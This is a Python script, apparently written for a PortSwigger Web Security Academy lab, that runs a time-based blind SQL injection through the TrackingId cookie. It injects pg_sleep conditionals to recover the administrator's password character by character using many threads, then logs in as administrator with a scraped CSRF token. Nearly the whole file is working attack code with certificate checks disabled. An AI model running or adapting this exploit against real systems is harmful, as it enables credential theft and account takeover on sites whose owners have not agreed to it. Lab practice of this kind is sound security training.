import sys
import requests
import urllib3
import urllib
from bs4 import BeautifulSoup
import threading

# Disable warnings for insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up proxy for HTTP requests (if needed)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Global variables for storing the extracted password and thread lock
password_extracted = ""
lock = threading.Lock()  # Lock for thread-safe operations

# Helper function to send the payload and return the response
def send_payload(url, cookies):
    try:
        response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    except:
        # If there's an issue with the proxy, send the request without it
        response = requests.get(url, cookies=cookies, verify=False)
    return response

# Function to extract a single character for the password at the specified position
def extract_character(url, tracking_id, session_id, char_position, ascii_value):
    global password_extracted

    # Construct the SQL injection payload to retrieve the character at the current position
    sql_injection_payload = "' || (SELECT CASE WHEN (username='administrator' and ASCII(SUBSTRING(password,%s,1))='%s') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users) --" % (char_position, ascii_value)
    payload_encoded = urllib.parse.quote(sql_injection_payload)  # URL encode the payload

    # Set cookies with the dynamically retrieved tracking ID and session ID
    cookies = {
        'TrackingId': tracking_id + payload_encoded,
        'session': session_id
    }

    # Send the request with the constructed cookies
    response = send_payload(url, cookies)

    # Check if the response took longer than 5 seconds (indicating the correct character)
    if int(response.elapsed.total_seconds()) >= 5:
        with lock:  # Lock access to the shared resource
            password_extracted += chr(ascii_value)  # Add the found character
        return True
    return False

# Function to extract the administrator's password using SQL injection
def extract_admin_password(url, tracking_id, session_id):
    global password_extracted
    password_extracted = ""  # Initialize an empty string to store the extracted password
    threads = []  # List to keep track of threads

    # Loop through the length of the password (assumed to be 20 characters)
    for char_position in range(1, 21):
        for ascii_value in range(32, 126):  # Loop through possible ASCII values for characters
            # Create a thread for each character extraction attempt
            thread = threading.Thread(target=extract_character, args=(url, tracking_id, session_id, char_position, ascii_value))
            thread.start()  # Start the thread
            threads.append(thread)  # Add the thread to the list

        # Wait for all threads to finish before moving to the next character position
        for thread in threads:
            thread.join()

        # Print the current state of the extracted password
        sys.stdout.write('\r' + password_extracted)
        sys.stdout.flush()  # Flush the output to update the display

        # Stop if the password reaches 20 characters
        if len(password_extracted) == 20:
            print(f"\n[+] The administrator password is: {password_extracted}")
            # Attempt to log in as the administrator
            if login_as_admin(requests.Session(), url + "/login", password_extracted):
                print("[+] SQL injection successful! Logged in as Administrator :)")
            else:
                print("[-] SQL injection unsuccessful!")
            return  # Exit the function once the password is found

    print("[-] Failed to retrieve administrator credentials.")

# Function to get the initial cookie values (TrackingId and session)
def get_initial_cookies(url):
    try:
        response = requests.get(url, verify=False, proxies=proxies)
    except:
        response = requests.get(url, verify=False)

    # Extract cookies from the response
    tracking_id = response.cookies.get('TrackingId', '')
    session_id = response.cookies.get('session', '')

    if not tracking_id or not session_id:
        print("[-] Failed to retrieve cookies from the target website.")
        sys.exit(1)

    return tracking_id, session_id

# Function to get CSRF token from the login page
def get_csrf_token(session, url):
    try:
        response = session.get(url, verify=False, proxies=proxies)
    except:
        response = session.get(url, verify=False)

    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input")['value']
    return csrf_token

# Function to log in as the administrator using the extracted password
def login_as_admin(session, url_login, admin_password):
    csrf_token = get_csrf_token(session, url_login)
    login_data = {
        "csrf": csrf_token,
        "username": "administrator",
        "password": admin_password
    }

    try:
        response = session.post(url_login, data=login_data, verify=False, proxies=proxies)
    except:
        response = session.post(url_login, data=login_data, verify=False)

    if "Log out" in response.text:
        return True
    return False

# Main function to execute the SQL injection attack
def main():
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        url = 'https://0a5f002204305508810c5758000200a9.web-security-academy.net'  # Update Domain here

    print("(*)[-] WARNING USING SUPER FAST MODE (May Not Work)")


    print("(+) Retrieving initial cookies from the website...")
    tracking_id, session_id = get_initial_cookies(url)

    print("(+) Retrieving administrator password...")
    extract_admin_password(url, tracking_id, session_id)

# Run the main function when the script is executed
if __name__ == "__main__":
    main()
